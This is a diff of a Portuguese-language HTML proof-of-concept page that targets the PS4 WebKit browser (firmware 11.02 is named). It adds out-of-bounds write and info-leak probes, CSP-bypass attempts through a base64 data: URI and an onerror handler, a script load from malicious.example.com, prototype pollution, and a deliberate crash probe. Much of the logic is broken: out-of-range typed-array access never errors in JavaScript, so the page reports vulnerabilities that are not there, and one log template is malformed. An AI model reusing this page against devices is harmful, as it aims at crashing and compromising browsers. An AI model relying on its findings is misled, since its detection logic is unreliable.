@@ -2,8 +2,9 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - OOB Write / CSP Bypass / Prototype Pollution</title>
+    <title>PS4 WebKit PoC - Testes Agressivos</title>
     <style>
+        /* Estilos CSS (iguais ao script anterior) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; }
@@ -14,159 +15,186 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Demonstração Combinada</h1>
-    <p>Observação: Este script tenta demonstrar vulnerabilidades (OOB Write, CSP Bypass, Prototype Pollution). Carregue em um PS4 com firmware vulnerável (ex: 11.02 ou similar, conforme reportado) e observe o log abaixo.</p>
+    <h1>PS4 WebKit PoC - Demonstração Agressiva</h1>
+    <p>Observação: Este script tenta demonstrar vulnerabilidades (OOB Write, Info Leak, CSP Bypass, Prototype Pollution) e inclui uma tentativa de CRASH ao final. Carregue em um PS4 com firmware vulnerável (ex: 11.02 ou similar) e observe o log abaixo.</p>
     <div id="poc-output"></div>
 
     <script>
         const outputDiv = document.getElementById('poc-output');
         const log = (message, type = 'info') => {
+            // Função log (igual ao script anterior)
             if (outputDiv) {
                 const timestamp = `[${new Date().toLocaleTimeString()}] `;
-                outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${message}\n</span>`;
+                // Sanitize basic HTML tags from message to prevent log injection issues
+                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${sanitizedMessage}\n</span>`;
                 outputDiv.scrollTop = outputDiv.scrollHeight; // Auto-scroll
             } else {
                 console.error("Elemento #poc-output não encontrado!");
             }
         };
 
-        // --- Teste 1: Out-Of-Bounds (OOB) Write ---
-        const runOOBTest = async () => {
-            log("--- Iniciando Teste: OOB Write ---", 'test');
+        // --- Teste 1: Out-Of-Bounds (OOB) Write + Info Leak ---
+        const runOOBTestAndLeak = async () => {
+            log("--- Iniciando Teste: OOB Write + Info Leak ---", 'test');
             try {
                 const bufferSize = 32;
                 const buffer = new ArrayBuffer(bufferSize);
                 const view = new Uint8Array(buffer);
                 const writeValue = 0xEE;
-                // Offsets que demonstraram sucesso nos logs originais
-                const testOffsets = [-1, bufferSize, bufferSize + 1];
+                // Offsets de escrita OOB que funcionaram
+                const writeOffsets = [-1, bufferSize, bufferSize + 10]; // Incluído um mais distante
+                // Offsets de leitura (incluindo OOB adjacentes)
+                const readOffsets = [0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 4, bufferSize + 8];
 
-                for (const offset of testOffsets) {
-                    log(`Tentando escrita OOB no offset ${offset}...`, 'info');
+                for (const writeOffset of writeOffsets) {
+                    log(`Tentando escrita OOB no offset ${writeOffset}...`, 'info');
+                    let writeSuccess = false;
                     try {
-                        view[offset] = writeValue;
-                        // Se chegou aqui sem erro, é a vulnerabilidade!
-                        log(`VULNERÁVEL: Escrita OOB no offset ${offset} bem-sucedida (sem erro)!`, 'vuln');
+                        view[writeOffset] = writeValue;
+                        log(`VULNERÁVEL: Escrita OOB no offset ${writeOffset} bem-sucedida (sem erro)!`, 'vuln');
+                        writeSuccess = true;
                     } catch (writeError) {
-                        log(`✅ Escrita OOB no offset ${offset} bloqueada/erro: ${writeError.message}`, 'good');
+                        log(`✅ Escrita OOB no offset ${writeOffset} bloqueada/erro: ${writeError.message}`, 'good');
                     }
-                    await new Promise(resolve => setTimeout(resolve, 50)); // Pequena pausa
+
+                    // Se a escrita OOB funcionou, tentar ler memória adjacente (Info Leak)
+                    if (writeSuccess) {
+                        log(`Tentando ler memória após escrita OOB em ${writeOffset}...`, 'info');
+                        for (const readOffset of readOffsets) {
+                            try {
+                                const readValue = view[readOffset];
+                                const readValueHex = (readValue !== undefined ? `0x${readValue.toString(16)}` : 'undefined');
+                                if (readOffset >= bufferSize) {
+                                    // Se lemos fora dos limites sem erro, é um potencial leak
+                                     log(`INFO LEAK? Leitura OOB no offset ${readOffset} retornou: ${readValueHex}`, 'warn');
+                                     if(readValue !== undefined && readValue !== 0){
+                                        log(`VULNERÁVEL: Leitura OOB retornou valor não nulo/definido (${readValueHex}) no offset ${readOffset}!`, 'vuln');
+                                     }
+                                } else {
+                                     log(`Leitura IN-BOUNDS no offset ${readOffset} retornou: ${readValueHex}`, 'info');
+                                }
+                            } catch (readError) {
+                                log(`Erro ao tentar ler offset ${readOffset}: ${readError.message}`, 'warn');
+                            }
+                        }
+                    }
+                     await new Promise(resolve => setTimeout(resolve, 100)); // Pequena pausa
                 }
-                log("--- Teste OOB Concluído ---", 'test');
+                log("--- Teste OOB Write + Info Leak Concluído ---", 'test');
 
             } catch (e) {
-                log(`Erro GERAL no teste OOB: ${e.message}`, 'warn');
+                log(`Erro GERAL no teste OOB/Leak: ${e.message}`, 'warn');
             }
         };
 
         // --- Teste 2: CSP Bypass ---
         const runCSPTest = () => {
+            // Função runCSPTest (igual ao script anterior)
             log("--- Iniciando Teste: CSP Bypass ---", 'test');
-
-            // 2.1: Teste com data: URI (deve funcionar se vulnerável)
+            // 2.1: Teste com data: URI
             log("Tentando carregar script via data: URI...", 'info');
             try {
                 const scriptTag = document.createElement('script');
-                // Base64 de: log("VULNERÁVEL: Bypass de CSP via data: URI bem-sucedido!", 'vuln');
                 scriptTag.src = 'data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw==';
                 document.body.appendChild(scriptTag);
-                // Log de sucesso será adicionado pela própria tag script se funcionar
-            } catch (e) {
-                 log(`Erro ao criar tag script data:: ${e.message}`, 'warn');
-            }
-
-            // 2.2: Teste com inline handler (deve funcionar se vulnerável)
+            } catch (e) { log(`Erro ao criar tag script data:: ${e.message}`, 'warn'); }
+            // 2.2: Teste com inline handler
             log("Tentando executar script via inline handler (onerror)...", 'info');
             try {
                 const imgTag = document.createElement('img');
-                imgTag.src = 'x'; // Força o erro
+                imgTag.src = 'x';
                 imgTag.onerror = () => { log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln'); };
                 document.body.appendChild(imgTag);
-                 // Log de sucesso será adicionado pelo próprio handler se funcionar
-            } catch (e) {
-                 log(`Erro ao criar tag img com onerror: ${e.message}`, 'warn');
-            }
-
-            // 2.3: Teste com fonte externa (deve ser bloqueado)
+            } catch (e) { log(`Erro ao criar tag img com onerror: ${e.message}`, 'warn'); }
+            // 2.3: Teste com fonte externa
             log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info');
              try {
                 const externalScript = document.createElement('script');
-                externalScript.src = 'https://malicious.example.com/blocked.js'; // Domínio não existente/confiável
-                externalScript.onload = () => { log("ERRO DE LÓGICA: CSP NÃO bloqueou script externo!", 'vuln'); }; // Não deve acontecer
-                externalScript.onerror = () => { log("✅ Bloqueio CSP esperado para script externo funcionou (ou falha de rede).", 'good'); }; // Esperado
+                externalScript.src = 'https://malicious.example.com/blocked.js';
+                externalScript.onload = () => { log("ERRO DE LÓGICA: CSP NÃO bloqueou script externo!", 'vuln'); };
+                externalScript.onerror = () => { log("✅ Bloqueio CSP esperado para script externo funcionou (ou falha de rede).", 'good'); };
                 document.body.appendChild(externalScript);
-            } catch (e) {
-                 log(`Erro ao criar tag script externa: ${e.message}`, 'warn');
-            }
-
+            } catch (e) { log(`Erro ao criar tag script externa: ${e.message}`, 'warn'); }
             log("--- Teste CSP Concluído (Verifique logs acima para resultados 'VULNERÁVEL') ---", 'test');
         };
 
         // --- Teste 3: Prototype Pollution ---
         const runPrototypePollutionTest = () => {
-            log("--- Iniciando Teste: Prototype Pollution ---", 'test');
+             // Função runPrototypePollutionTest (igual ao script anterior)
+             log("--- Iniciando Teste: Prototype Pollution ---", 'test');
             const pollutionKey = 'poc_injected_property';
             const pollutionValue = 'Polluted!';
-
             try {
                 log(`Tentando poluir Object.prototype com '${pollutionKey}'...`, 'info');
                 Object.prototype[pollutionKey] = pollutionValue;
-
-                // Verificar poluição em objetos chave
                 const testObjects = { 'window': window, 'document': document, 'novoObjeto': {} };
                 let pollutedCount = 0;
                 for (const name in testObjects) {
                     try {
-                         // Usar 'in' ou 'hasOwnProperty' pode ser enganado, checar diretamente
-                         // Cuidado com accessors que podem gerar erro
                          if (testObjects[name] && testObjects[name][pollutionKey] === pollutionValue) {
                             log(`VULNERÁVEL: Prototype Pollution detectada! ${name}.${pollutionKey} = ${testObjects[name][pollutionKey]}`, 'vuln');
                             pollutedCount++;
-                        } else {
-                             // Pode não ter herdado ou ser um objeto sem prototype chain padrão
-                             // log(`Objeto '${name}' não parece diretamente poluído ou inacessível.`, 'info');
                         }
-                    } catch(checkError){
-                         log(`Aviso ao verificar ${name}: ${checkError.message}`, 'warn');
-                    }
+                    } catch(checkError){ log(`Aviso ao verificar ${name}: ${checkError.message}`, 'warn'); }
                 }
-
-                if (pollutedCount > 0) {
-                     log(`Confirmação: ${pollutedCount} objeto(s) chave demonstraram herdar a propriedade poluída.`, 'vuln');
-                } else {
-                     log(`Aviso: Não foi possível confirmar a poluição nos objetos de teste. Verifique manualmente.`, 'warn');
-                }
-
-                 // Limpeza (importante!)
-                 try {
-                    delete Object.prototype[pollutionKey];
-                    log("Tentativa de limpar poluição do prototype.", 'info');
-                 } catch (cleanError){
-                    log(`Erro ao limpar poluição: ${cleanError.message}`, 'warn');
-                 }
-
-
-            } catch (e) {
-                log(`Erro GERAL no teste de Prototype Pollution: ${e.message}`, 'warn');
-            }
+                if (pollutedCount > 0) { log(`Confirmação: ${pollutedCount} objeto(s) chave demonstraram herdar a propriedade poluída.`, 'vuln'); }
+                else { log(`Aviso: Não foi possível confirmar a poluição nos objetos de teste.`, 'warn'); }
+                 try { delete Object.prototype[pollutionKey]; log("Tentativa de limpar poluição do prototype.", 'info'); }
+                 catch (cleanError){ log(`Erro ao limpar poluição: ${cleanError.message}`, 'warn'); }
+            } catch (e) { log(`Erro GERAL no teste de Prototype Pollution: ${e.message}`, 'warn'); }
              log("--- Teste Prototype Pollution Concluído ---", 'test');
         };
 
+        // --- Teste 4: OOB Crash Probe ---
+        const runOOBCrashProbe = async () => {
+            log("--- Iniciando Teste: OOB Crash Probe ---", 'test');
+            log("AVISO: A próxima operação tentará uma escrita OOB agressiva que PODE TRAVAR o navegador.", 'warn');
+            log("Se o navegador travar após esta mensagem, o teste foi provavelmente bem-sucedido em causar instabilidade.", 'warn');
+            await new Promise(resolve => setTimeout(resolve, 3000)); // Pausa para ler o aviso
+
+            try {
+                const bufferSize = 32;
+                const buffer = new ArrayBuffer(bufferSize);
+                const view = new Uint8Array(buffer);
+                const crashOffset = -20000; // Offset negativo grande, comum causar crash
+                const writeValue = 0xDEADBEEF; // Valor grande
+
+                log(`Tentando escrita OOB AGRESSIVA no offset ${crashOffset} com valor ${writeValue.toString(16)}...`, 'info');
+
+                view[crashOffset] = writeValue;
+
+                // Se chegou aqui, NÃO travou (o que é inesperado para um crash probe 'bem-sucedido')
+                log("AVISO: Escrita OOB agressiva no offset ${crashOffset} NÃO causou travamento imediato.", 'warn');
+
+            } catch (e) {
+                 // Pode dar erro em vez de travar, dependendo da implementação
+                log(`Erro durante crash probe (NÃO travou): ${e.message}`, 'warn');
+            }
+             log("--- Teste OOB Crash Probe Concluído (se não travou) ---", 'test');
+        };
+
+
         // --- Função Principal de Execução ---
         const runAllTests = async () => {
-            log("Iniciando todos os testes de PoC...");
+            log("Iniciando todos os testes de PoC (versão agressiva)...");
 
-            await runOOBTest();
+            await runOOBTestAndLeak(); // Teste 1: OOB Write + Info Leak
             log("\nPausa de 2 segundos...\n", 'info');
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            runCSPTest();
+            runCSPTest(); // Teste 2: CSP Bypass
             log("\nPausa de 2 segundos...\n", 'info');
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            runPrototypePollutionTest();
+            runPrototypePollutionTest(); // Teste 3: Prototype Pollution
+            log("\nPausa de 2 segundos...\n", 'info');
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
-            log("\n\nTodos os testes PoC foram concluídos. Revise o log acima.", 'test');
+            await runOOBCrashProbe(); // Teste 4: OOB Crash Probe (PODE TRAVAR AQUI)
+
+            // Esta mensagem pode não aparecer se o crash probe funcionar
+            log("\n\nTodos os testes PoC foram concluídos (se não travou). Revise o log acima.", 'test');
         };
 
         // Executar ao carregar a página
